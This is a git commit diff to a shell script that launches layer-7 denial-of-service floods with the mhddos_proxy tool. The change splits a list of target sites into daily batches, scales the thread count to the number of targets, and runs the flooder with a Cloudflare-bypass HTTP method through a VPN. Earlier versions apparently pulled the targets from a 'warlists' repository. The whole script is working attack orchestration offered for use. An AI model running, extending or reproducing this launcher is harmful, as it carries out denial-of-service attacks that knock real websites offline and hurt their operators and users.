e4fad4b7b50992f710598ebda626035916de34dc
Flux State <f1ux.state@pm.me>
2022-07-10 06:07:56 +0200

    split attack

--- scripts/run_l7_cf.sh
+++ scripts/run_l7_cf.sh
@@ -1,10 +1,24 @@
-#!/usr/bin/env sh
+#!/usr/bin/env bash
 
 # https://github.com/porthole-ascend-cinnamon/mhddos_proxy
 
+calc() { awk "BEGIN{ printf \"%.2f\n\", $* }"; }
+
+BASE_DIR="$(dirname -- "$(readlink -f "${BASH_SOURCE}")")"
+BASE_FILE='l7_cf.lst'
+CURRENT_DAY=$(printf %02d `date +%d`)
+DAYS_IN_MONTH=$(cal |egrep -v [a-z] |wc -w)
+LINES=$(cat $BASE_DIR/../$BASE_FILE | wc -l)
+LINES_PER_PART=$(echo "$(calc "$LINES/$DAYS_IN_MONTH")" | python3 -c "print(round(float(input())))")
+TARGETS_FILE="$BASE_DIR/../$BASE_FILE"
+TARGETS_FILE_SPLIT="$BASE_DIR/../$BASE_FILE.$CURRENT_DAY"
+((THREADS=$LINES*(2**3)))
+
+split --numeric-suffixes=1 -l $LINES_PER_PART $TARGETS_FILE "$TARGETS_FILE."
+
 python3 runner.py \
-  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_cf.lst \
+  --config "$TARGETS_FILE_SPLIT" \
   --http-methods CFB \
   --lang en \
-  --threads 128 \
+  --threads "$THREADS" \
   --vpn
